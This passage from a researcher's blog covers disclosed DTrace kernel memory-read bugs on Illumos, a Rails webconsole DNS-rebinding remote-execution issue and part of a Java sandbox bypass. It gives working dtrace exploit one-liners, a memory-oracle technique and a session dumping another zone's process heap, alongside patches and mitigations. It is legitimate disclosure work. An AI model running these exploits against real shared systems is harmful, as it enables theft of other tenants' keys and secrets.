</span><span class='line'>    E: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
</span><span class='line'>    I: basic
</span><span class='line'>    P: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
</span><span class='line'>    L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb</span></code></pre></td></tr></table></div></figure>



</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/01/07/arbitrary-kernel-memory-reads-on-illumos/">Arbitrary Kernel Memory Reads on Illumos</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-01-07T07:02:05+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Illumos is the name of the operating system that was forked from OpenSolaris and is being used to power Joyent&rsquo;s <a href="https://www.joyent.com/triton">Triton</a> cloud platform. Joyent have their own branded version of Illumos called SmartOS. Joyent&rsquo;s cloud is interesting because they offer hosting using Zones where customers share the same kernel. This is in contrast to traditional cloud providers who provide isolation between customers using virtual machines. However, it seems that kernel provided isolation is becoming more popular. Looking at AWS Lambda it appears that Linux kernel namespaces are being used to provide isolation. Because the kernel is used to provide isolation it means the whole of the kernel becomes an attack surface. This is especially interesting in the case of Illumos because Illumos runs an interpreter inside the kernel called DTrace which is one of the big selling points of Triton.</p>

<p>DTrace is an incredibly complex piece of code and it consists of more than 17k lines of C code. It is very difficult to write this amount of C code without introducing lots of bugs :( During my review of the DTrace source code I stumbled across two integer overflows and an out of bound read that could be converted to arbitrary kernel writes. I also found five bugs that could be used for arbitrary memory reads. I find exploitation of these arbitrary memory reads more interesting than the privilege escalation bugs so I&rsquo;m going to write about four of these first. I intend to write up the other bugs but these were disclosed starting from September 2015 so don&rsquo;t hold your breath.</p>

<h1>DTrace Copy Out</h1>

<p>If you look at the <a href="http://docs.oracle.com/cd/E19253-01/819-5488/gcfsd/">DTrace user guide</a> it has this definition for the <code>copyout</code> function:</p>

<blockquote><p>void copyout(void *buf, uintptr_t addr, size_t nbytes)`</p><p>The `copyout()` action copies data from a buffer to an address in memory. The number of bytes that this action copies is specified in nbytes. The buffer that the data is copied from is specified in buf. The address that the data is copied to is specified in addr. That address is in the address space of the process that is associated with the current thread.</p></blockquote>


<p>When you call <code>copyout</code> <a href="https://github.com/joyent/illumos-joyent/blob/20150820/usr/src/uts/common/dtrace/dtrace.c#L4174">this code</a> is run by DTrace:</p>

<pre><code>case DIF_SUBR_COPYOUT: {
  uintptr_t kaddr = tupregs[0].dttk_value;
  uintptr_t uaddr = tupregs[1].dttk_value;
  uint64_t size = tupregs[2].dttk_value;

  if (!dtrace_destructive_disallow &amp;&amp;
      dtrace_priv_proc_control(state, mstate) &amp;&amp;
      !dtrace_istoxic(kaddr, size)) {
    DTRACE_CPUFLAG_SET(CPU_DTRACE_NOFAULT);
    dtrace_copyout(kaddr, uaddr, size, flags);
    DTRACE_CPUFLAG_CLEAR(CPU_DTRACE_NOFAULT);
  }
  break;
}
</code></pre>

<p>Unfortunately, <code>copyout</code> does exactly what it says on the tin. It copies out kernel memory into userspace without any checks :(. The <code>kaddr</code> and <code>size</code> values are completely controlled by the user. If we check the rest of the call path there is no code that checks that the user is allowed access to the range specified by <code>kaddr</code> and <code>size</code>. In fact, there is a function specifically designed to check this called <code>dtrace_canload</code> but this was not used. <a href="https://github.com/joyent/illumos-joyent/commit/395c7a3dcfc66b8b671dc4b3c4a2f0ca26449922#diff-64e6f1587817235d06f7d2db19a97967R4186">The patch</a> fixes this issue by adding a <code>dtrace_canload</code> check:</p>

<pre><code>  if (!dtrace_destructive_disallow &amp;&amp;
        dtrace_priv_proc_control(state, mstate) &amp;&amp;
-        !dtrace_istoxic(kaddr, size)) {
+        !dtrace_istoxic(kaddr, size) &amp;&amp;
+        dtrace_canload(kaddr, size, mstate, vstate)) {
</code></pre>

<h1>Exploiting Arbitrary Memory Reads</h1>

<p>At first glance there doesn&rsquo;t seem to be that much interesting stuff in Illumos to read from kernel memory. Illumos doesn&rsquo;t have KASLR so you can&rsquo;t use an arbitrary memory to discover where stuff is mapped in to bypass KASLR. It should be possible to dump the filesystem buffer cache or even kernel SLABs used for syscall args which could hold sensitive information from other processes on the system but I didn&rsquo;t persue this option.</p>

<p>It would be great if you could dump memory from other processes but this is not possible on x86 because only the currently running process and the kernel are mapped into memory. However, luckily for us Illumos 64bit maps all the physical memory at a known address in the kernel&rsquo;s virtual address space. I think this is done to make it easier to set up page tables. So all you have to do to read the memory from another process is convert the virtual address you want to read to a physical address and then just add this physical address to the kernel physical address offset (<code>kpm_vbase</code>). This is all possible because the information to do this is inside the kernels memory and we have an arbitrary kernel memory read. The location of all these static locations like <code>kpm_vbase</code> are also helpfully exported by the kernel (they are not really secret anyway because no KASLR) and can be accessed using a library called libctf. That doesn&rsquo;t stand for lib capture the flag :(</p>

<p>We can also get a list of all the running processes from the <code>practive</code> linked list. Normally when you are inside a Zone you can only see processes inside your own Zone. This allows us to create a tool that can be plugged in with an arbitrary kernel memory read and provide us with a ps that will dump all the processes running on the system and allow us to dump the memory contained in these processes.</p>

<p>Here is an example session with the tool being used to dump the heap from a vim process running in the global zone:</p>

<pre><code>./global_ps

PID COMMAND PSARGS BRKBASE
8024 global_ps ./global_ps 0x414b90
8015 vim vim secret.txt 0x81f8be8

./global_ps segment -p 8015

ADDRESS SIZE FLAGS
0xfec2f000 4096
0x81ef000 188416 [heap]

./global_ps dump -p 8015 -a 0x81ef000 -s 188416 &gt; dump
</code></pre>

<p>In a shared system this can be very dangerous because you can read private keys, and authentication information from other processes. It also shows that relatively benign vulnerabilities can be very serious on systems that are used for shared hosting.</p>

<p><a href="https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-169/global_ps.c">POC Code on Github</a></p>

<h1>DTrace INET_NTOA</h1>

<p>This is a similar issue to the <code>copyout</code> problem. This is what the <a href="https://docs.oracle.com/cd/E36784_01/html/E36846/gkwzy.html">DTrace user guide</a> has to say about <code>inet_nota</code></p>

<blockquote><p>string inet_ntoa(ipaddr_t *addr)</p><p>    inet_ntoa takes a pointer to an IPv4 address and returns it as a dotted quad decimal string. This is similar to inet_ntoa() from libnsl as described in inet(3SOCKET), however this D version takes a pointer to the IPv4 address rather than the address itself. The returned string is allocated out of scratch memory, and is therefore valid only for the duration of the clause. If insufficient scratch space is available, inet_ntoa does not execute and an error is generated.</p></blockquote>


<p>The <a href="https://github.com/joyent/illumos-joyent/blob/eef9c9737ad811523f9628507a5a0225058634bf/usr/src/uts/common/dtrace/dtrace.c#L5334">code</a> for the <code>inet_ntoa</code> function does not do any checking to see if the <code>addr</code> is allowed to be accessed.</p>

<pre><code>case DIF_SUBR_INET_NTOA:
case DIF_SUBR_INET_NTOA6:
case DIF_SUBR_INET_NTOP: {
  size_t size;
  int af, argi, i;
  char *base, *end;

  if (subr == DIF_SUBR_INET_NTOP) {
    af = (int)tupregs[0].dttk_value;
    argi = 1;
  } else {
    af = subr == DIF_SUBR_INET_NTOA ? AF_INET: AF_INET6;
    argi = 0;
  }

  if (af == AF_INET) {
    ipaddr_t ip4;
    uint8_t *ptr8, val;

    /*
     * Safely load the IPv4 address.
     */
    ip4 = dtrace_load32(tupregs[argi].dttk_value);
</code></pre>

<p>The <code>tupregs[argi].dttk_value</code> value can be controlled by the user and there is no call to <code>dtrace_canload</code>. This comment about &lsquo;Safely&rsquo; is misleading in this context because <code>dtrace_load32</code> prevents the kernel from panicing on a bad load and prevents access to memory mapped IO regions. So by using <code>inet_ntoa</code> we can read 4 bytes of arbitrary kernel memory. We just need to parse the dotted IP address back to bytes.</p>

<p>This bug is interesting because it can be demonstrated from the command line.</p>

<pre><code>&gt;  dtrace -n 'BEGIN{ print(inet_ntoa((in_addr_t*)&amp;`_mmu_pagemask))}'
dtrace: description 'BEGIN' matched 1 probe
CPU     ID                    FUNCTION:NAME
  0      1                           :BEGIN string "0.240.255.255"
</code></pre>

<p>From the global zone we can verify it has read the 4 bytes 0x00f0ffff</p>

<pre><code>&gt; echo '_mmu_pagemask::dump'| mdb -k
                    0 1 2 3  4 5 6 7 \/ 9 a b  c d e f  01234567v9abcdef
fffffffffb94a1d0:  ff0f0000 00000000 00f0ffff ffffffff  ................
</code></pre>

<p>We can plug this vulnerability into our framework and use it to list processes and dump their memory contents. You might be concerned that reading 4 bytes at a time is slow but there is no noticable delay when listing processes.</p>

<p><a href="https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-274/global_ps2.c">POC Code on Github</a></p>

<h1>DTrace Hash Corruption</h1>

<p>DTrace has support for hashmaps and allows the user to access the data in the hashmap using the store and load instructions. DTrace tries to separate the metadata from the data and only allow the user to modify the data. However, it is possible to modify the metadata and this allows an attacker to create a memory oracle. An attacker can choose an address and an array of bytes and check whether the memory at that address is equal to the array of bytes. This is equivalent to a slow arbitrary memory read because you can check a single byte 256 times to read a single byte of memory.</p>

<p>In <code>dtrace_canstore</code> it checks that the offset into the hash chunk is greater
than the size of <code>dtrace_dynvar_t.</code></p>

<p><a href="https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L679">https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L679</a></p>

<pre><code>chunkoffs = (addr - base) % dstate-&gt;dtds_chunksize;

if (chunkoffs &lt; sizeof (dtrace_dynvar_t))
  return (0);
</code></pre>

<p>Presumably, it is doing this to prevent the user from writing to the metadata
in the hash chunk and the author believed all the metadata is contained in the
<code>dtrace_dynvar_t</code> structure. This belief is true but <code>dtrace_dynvar_t</code> is a
dynamically sized structure with the embedded structure <code>dtrace_tuple</code>
containing a dynamically sized array of <code>dtrace_key</code> structures.</p>

<pre><code>typedef struct dtrace_dynvar {
  uint64_t dtdv_hashval;      /* hash value -- 0 if free */
  struct dtrace_dynvar *dtdv_next;  /* next on list or hash chain */
  void *dtdv_data;      /* pointer to data */
  dtrace_tuple_t dtdv_tuple;    /* tuple key */
} dtrace_dynvar_t;

typedef struct dtrace_tuple {
  uint32_t dtt_nkeys;     /* number of keys in tuple */
  uint32_t dtt_pad;     /* padding */
  dtrace_key_t dtt_key[1];    /* array of tuple keys */
} dtrace_tuple_t;

typedef struct dtrace_key {
  uint64_t dttk_value;      /* data value or data pointer */
  uint64_t dttk_size;     /* 0 if by-val, &gt;0 if by-ref */
} dtrace_key_t;
</code></pre>

<p>So if there is more than one key value then an attacker is able to write into
the key values beyond the first one. The <code>dttk_value</code> field is treated as
pointer if the <code>dttk_size</code> field is non-zero.</p>

<p>Unfortunately, the only place where <code>dttk_value</code> field seems to be used is as
an argument to the <code>dtrace_bcmp</code> function. When the hashmap looks up a value and
finds a matching entry based on the hash code it checks that the keys are equal
using the <code>dtrace_bcmp</code> function.</p>

<p><a href="https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L1791">https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L1791</a></p>

<pre><code>for (i = 0; i &lt; nkeys; i++, dkey++) {
  if (dkey-&gt;dttk_size != key[i].dttk_size)
    goto next; /* size or type mismatch */

  if (dkey-&gt;dttk_size != 0) {
    if (dtrace_bcmp(
        (void *)(uintptr_t)key[i].dttk_value,
        (void *)(uintptr_t)dkey-&gt;dttk_value,
        dkey-&gt;dttk_size))
      goto next;
  } else {
    if (dkey-&gt;dttk_value != key[i].dttk_value)
      goto next;
  }
}
</code></pre>

<p>So we don&rsquo;t have a direct read or write primitive but we can tell indirectly
if a piece of memory is identical to the value the <code>dttk_value</code> field points to.
We can do this by:</p>

<ol>
<li><p>Storing a value in the hash with two keys. A first dummy key and a second key
which is the the byte we want to check. ie:</p>

<pre><code>  buf[0] = 0xff; hash[1, buf] = "h"
</code></pre></li>
<li><p>We can find the address of the <code>dttk_value</code> field for second key by doing:</p>

<pre><code> addr = (&amp;hash[1, buf][0]) - 0x28
</code></pre>

<p> Example showing the address of the value:</p>

<pre><code> [root@web01 ~]# dtrace -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]); print(addr)}'
 dtrace: description 'char buf[1]' matched 1 probe
 CPU     ID                    FUNCTION:NAME
   0      1                           :BEGIN char * 0xffffff00efa5c2d8
</code></pre>

<p> If you look at the memory layout in the kernel the address of the key is
 clearly 0x28 behind the value (0x68):</p>

<pre><code> 0xffffff00efa5c2d8-0x28,0x28::dump

                     \/
 0xffffff00efa5c2b0: d0c2a5ef 00ffffff 01000000 00000000
 0xffffff00efa5c2c0: 01000000 00000000 00000000 00000000
 0xffffff00efa5c2d0: ff000000 00000000 68000000 00000000
</code></pre></li>
<li><p>We can change the pointer stored in the <code>dttk_value</code> field by doing:
<code>*(unsigned long*)addr = 0xdeadbeefdeadbeefL</code> and trigger a kernel panic by
looking up a value in the hash by doing <code>&amp;hash[1,buf][0]</code>.</p>

<pre><code>  [root@web01 ~]# dtrace -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]) - 0x28; print(addr); *(unsigned long*)addr = 0xdeadbeefdeadbeefL; &amp;hash[1,buf][0]}'
  dtrace: description 'char buf[1]' matched 1 probe
</code></pre></li>
<li><p>We can turn this into a memory oracle by instead of putting a rubbish address
we put the address of a value we want to check and if we have dynvarsize=36 then
dtrace will only return a hash value if the byte at the address is equal to the
original <code>buf[0]=??</code> key. This is because the case where they are not equal
dtrace will try to allocate another chunk in the hash but there is no more
space for this chunk.</p></li>
</ol>


<p>Example where the byte mismatches <code>buf[0]=0xff</code>:</p>

<pre><code>[root@web01 ~]# dtrace -x dynvarsize=36 -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]) - 0x28; *(void**)addr = &amp;`dtrace_dynhash_sink; print(&amp;hash[1,buf][0])}'
dtrace: description 'char buf[1]' matched 1 probe
dtrace: 1 dynamic variable drop
</code></pre>

<p>Example where the byte matches <code>buf[0]=0x1</code>:</p>

<pre><code>[root@web01 ~]# dtrace -x dynvarsize=36 -n 'char buf[1]; BEGIN {buf[0]=0x1;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]) - 0x28; *(void**)addr = &amp;`dtrace_dynhash_sink; print(&amp;hash[1,buf][0])}'
dtrace: description 'char buf[1]' matched 1 probe
CPU     ID                    FUNCTION:NAME
  0      1                           :BEGIN char * 0xffffff00d80cb4d8
</code></pre>

<p>Doing 256 syscalls to read 1 byte is slow but the global ps is still responsive :)</p>

<p><a href="https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-465/global_ps3.c">POC Code on Github</a></p>

<h1>DTrace STRSTR</h1>

<p>If you look at the <a href="https://docs.oracle.com/cd/E37670_01/E38608/html/dt_strstr_actsub.html">DTrace user guide</a> it has this definition for the <code>strstr</code> function:</p>

<blockquote><p>string strstr(const char *s, const char *subs)</p><p>    strstr returns a pointer to the first occurrence of the substring subs in the string s. If s is an empty string, strstr returns a pointer to an empty string. If no match is found, strstr returns 0.</p></blockquote>


<p>The <code>dtrace_canload</code> function takes a pointer and a size for checking whether a range can be accessed. However, the <code>strstr</code> function just takes a pointer to a string. How is it possible for <code>strstr</code> to call <code>dtrace_canload</code> to check whether the string can be safely searched? The <a href="https://github.com/joyent/illumos-joyent/blob/release-20160218/usr/src/uts/common/dtrace/dtrace.c#L4257">original implementation</a> only checked <code>dtrace_canload</code> after the string had been searched.</p>

<pre><code>case DIF_SUBR_STRRCHR: {
  /*
   * We're going to iterate over the string looking for the
   * specified character.  We will iterate until we have reached
   * the string length or we have found the character.  If this
   * is DIF_SUBR_STRRCHR, we will look for the last occurrence
   * of the specified character instead of the first.
   */
  uintptr_t saddr = tupregs[0].dttk_value;
  uintptr_t addr = tupregs[0].dttk_value;
  uintptr_t limit = addr + state-&gt;dts_options[DTRACEOPT_STRSIZE];
  char c, target = (char)tupregs[1].dttk_value;

  for (regs[rd] = NULL; addr &lt; limit; addr++) {
    if ((c = dtrace_load8(addr)) == target) {
      regs[rd] = addr;

      if (subr == DIF_SUBR_STRCHR)
        break;
    }

    if (c == '\0')
      break;
  }

  if (!dtrace_canload(saddr, addr - saddr, mstate, vstate)) {
    regs[rd] = NULL;
    break;
  }

  break;
}
</code></pre>

<p>There doesn&rsquo;t seem to be any way to observe the result in <code>regs[rd]</code> before it is clobbered when <code>dtrace_canload</code> fails. All of this data is only visible to the current thread and not accessible globally. However, Illumos provides access to the hardware performance counters and allows you to set them to trace while in the kernel only.</p>

<p>It is possible to set <code>DTRACEOPT_STRSIZE</code> to an arbitrary value. So if strsize
is set to 1 then only one byte will be checked against the search value supplied
to the strchr function. This effectively means the strchr function is checking
if the byte at an address is a specific value. The number of instructions or branches taken will be different depending on whether the byte at the address is null, the byte at the address matches or the byte at the address is different.</p>

<p>If we set the performance counter
to be PAPI_br_ins (Branch instructions taken) on my machine it will take 645
for a correct value and 646 for an incorrect value. Also, it will always take
645 for a zero value. So by iterating through the byte values (1-255) and
calling strchr on each it is possible to read an arbitrary byte.</p>

<p>There is some noise which I suspect is caused by paging which can cause higher
values but if you discard any result that does not match 646 or 645 and try
again then this works out.</p>

<p>There is also a weird extra branch taken for some addresses. I believe this is because of the toxic range check. The toxic range check is done by <code>addr &gt; START &amp;&amp; addr &lt; END</code> so depending on whether <code>addr &gt; START</code> or not there will be a difference in the number of branches taken. (We ignore <code>addr</code> &lt; END` because we don&rsquo;t try to read from toxic ranges.) This read is not ambiguous because the extra branch translates to
either every byte not matching (all 646) or one byte not matching (646) and
all the other bytes having an unknown result (647).</p>

<p>Again we plug this vulnerability into our exploit framework and dump memory from arbitrary processes in other zones. :)</p>

<p><a href="https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-500/global_ps5.c">POC Code on Github</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2016/07/11/rails-webconsole-dns-rebinding/">Rails Webconsole DNS Rebinding</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2016-07-11T18:00:00+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The webconsole gem which ships with the Rails development server allows remote code execution via DNS Rebinding. I reported this issue to Rails on April 20th 2015. However, it may have been reported to them earlier because Homakov also found the issue independently and tweeted about it here:</p>

<div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">There are lots of dangerous interactions with localhost: I tweeted that with DNS rebinding we can RCE via REPL on any Rails app, no fix yet</p>&mdash; Egor Homakov (@homakov) <a href="https://twitter.com/homakov/status/686670899081273346">January 11, 2016</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Since this issue is semi-public I think it is better that the problem is made public before waiting for a fix that may never appear. It also important to note that many developer set ups are probably not vulnerable because they are using Pow to run Rails applications or their upstream DNS servers apply DNS rebinding protection.</p>

<p>The problem is same origin policy in browsers is broken for IP based security unless the server checks the Host header is what it expects it to be. And it looks like rails development mode does not do any checking of the Host header to see that the header is 127.0.0.1 or localhost.</p>

<p>The attack looks something like this:</p>

<ol>
<li>Attacker tricks user into going to a website they control. For example reallycoolflashgame.com (nothing looks suspicious..)</li>
<li>Attacker opens an iframe to sdjhskdf87.reallycoolflashgame.com:3000 (SOP policy is based on the port number and we open this in an iframe so we don&rsquo;t tip off the user that something suspicious is going on)</li>
<li>sdjhskdf87.reallycoolflashgame.com is a DNS record with a really short TTL. For example 60 seconds. Attacker then changes the DNS record to point from their IP address to 127.0.0.1</li>
<li>The original html page at sdjhskdf87.reallycoolflashgame.com:3000 starts making XHR requests after the TTL has expired. These requests get routed to the rails app and they can trigger the debug functionality remotely.</li>
</ol>


<p>I have a website that simulates this attack. If you visit this website on OSX and it starts the Calculator.app then you are definitely vulnerable. However, if it does not work then that might be because the attack is buggy and is not proof that you don&rsquo;t have a vulnerable setup.</p>

<ol>
<li>create a new rails project with rails new demo</li>
<li>cd demo; rails server</li>
<li>go to <a href="http://www.dnsrebinder.net/">http://www.dnsrebinder.net/</a> in your browser</li>
<li>You will have to wait about 60-80 seconds and if you are running OSX it will pop a calculator. If you are running something else it won&rsquo;t do anything useful :(. You can monitor what is happening in Chrome Developer tools. If you see a request that generates a 404 this is evidence that the DNS rebinding was successful.</li>
</ol>


<p>It might not work if your router or upstream DNS provider is filtering private ip ranges in DNS lookups. So you might have to set your DNS server to point to 8.8.8.8 (google DNS).</p>

<h2>Mitigations</h2>

<ol>
<li>Remove webconsole gem from your Gemfile.</li>
<li>Use pow.cx which hosts your Rails application under the .dev domain namespace and do not spawn Rails applications using the &lsquo;rails server&rsquo; command.</li>
<li>Use a DNS server that applies DNS rebinding filtering. It is important that it filters 127.0.0.0/8 and the IPV6 local addresses. In particular Rails5 Puma only binds to the IPV6 local address under OSX.</li>
</ol>


<h2>Update</h2>

<p>The same vulnerability effect the <a href="https://github.com/charliesome/better_errors">better errors gem</a>. Thanks to <a href="https://twitter.com/mikeycgto">@mikeycgto</a> for the pointer.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/11/09/zdi-13-XXX-java-sandbox-bypass-1-dot-7-0-10-slash-1-dot-6-0-38-via-proxy-and-jmx/">ZDI-13-XXX (2013) Java Sandbox Bypass (1.7.0_10) / (1.6.0_38) via Proxy and JMX</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-11-09T10:41:00+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is part of a series of posts detailing Java Sandbox Bypasses that were disclosed
between 2012-2013. You can view the other bugs by going back to the <a href="/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">original post</a>.</p>

<p>The last two vulnerabilities I wrote up ( <a href="/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream">ZDI-13-246</a>, <a href="/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">ZDI-13-075</a>) involved heap spraying so were not 100% reliable. Most of my sandbox bypasses against the JVM did not use memory corruption or heap spraying so were 100% reliable. These reliable sandbox bypasses fell into two main categories:</p>

<p>First there were vulnerabilites that would try to create a chain from privileged code to a &lsquo;dangerous&rsquo; function without touching any user frames. Java uses stack walking to decide whether a dangerous function (<code>System.setSecurityManager(null)</code>, <code>Runtime.execute</code>) is allowed to proceed so if you could create a chain then you could subvert the protection.</p>

<p>Second there were vulnerabilities that got access to methods in the &lsquo;protected packages&rsquo;. After getting access to these packages it is usually trivial to escalate out of the sandbox because it is assumed user code cannot access these methods. Access to these packages usually involved abusing reflection or parts of the JDK that used reflection but did not do so securely. This vulnerability which has existed at least since Java 5 is a good example of abusing reflection to access privileged packages.</p>

<p>This bug is interesting because there is no ZDI public disclosure for it. I suspect this is because <a href="http://www.security-explorations.com/en/about.html">Adam Gowdiak</a> disclosed it to Oracle first. Looking back I also suspect I may have sniped this vulnerability from Adam Gowdiak. Gowdiak seems to have a habit of partially publicly disclosing Java bugs before they are fixed. Another bug I disclosed to ZDI, ZDI-13-079 was based on a post he made to the full disclosure mailing list and I definitely sniped this bug from him. I can&rsquo;t remember the exact details about how I found this bug but I remember Gowdiak made a <a href="http://www.security-explorations.com/materials/se-2012-01-devoxx.pdf">presentation</a> where he said &lsquo;com.sun.xml.internal.bind.v2.model.nav.Navigator&rsquo; was an interesting class. It is possible that I was able to reverse the underlying bug from this.</p>

<h2>Vulnerabilies</h2>

<p>Three vulnerabilities are used to bypass the sandbox.</p>

<ol>
<li>Accessing Class instances in protected packages.</li>
<li>Reading fields on interfaces in protected packages.</li>
<li>Getting access to <code>java.lang.reflect.Method</code> for interface methods in
protected packages.</li>
</ol>


<h2>Loading Classes in Protected Packages</h2>

<p>The JmxMBeanServer class allows you to load classes from protected packages.
This isn&rsquo;t possible in Java 6.</p>

<pre><code>server = JmxMBeanServer.newMBeanServer("", null, null, true);
server.getMBeanInstantiator().findClass(className, (ClassLoader)null);
</code></pre>

<p>findClass in MBeanInstantiator ends up calling <code>loadClass(className, null)</code>
which will end up performing <code>Class.forName(className)</code>.</p>

<figure class='code'><figcaption><span>MBeanInstantiator.loadClass</span><a href='http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/com/sun/jmx/mbeanserver/MBeanInstantiator.java#MBeanInstantiator.loadClass%28java.lang.String%2Cjava.lang.ClassLoader%29'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">static</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">)</span>
</span><span class='line'>    <span class="kd">throws</span> <span class="n">ReflectionException</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">theClass</span><span class="o">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">className</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeOperationsException</span><span class="o">(</span><span class="k">new</span>
</span><span class='line'>            <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">&quot;The class name cannot be null&quot;</span><span class="o">),</span>
</span><span class='line'>                          <span class="s">&quot;Exception occurred during object instantiation&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>            <span class="n">loader</span> <span class="o">=</span> <span class="n">MBeanInstantiator</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">theClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">theClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">throw</span> <span class="k">new</span> <span class="nf">ReflectionException</span><span class="o">(</span><span class="n">e</span><span class="o">,</span>
</span><span class='line'>        <span class="s">&quot;The MBean class could not be loaded&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">theClass</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Reading Fields on Interfaces in Protected Packages</h2>

<p>If you call <code>Proxy.getProxyClass(null, new Class[]{targetClass})</code> then the
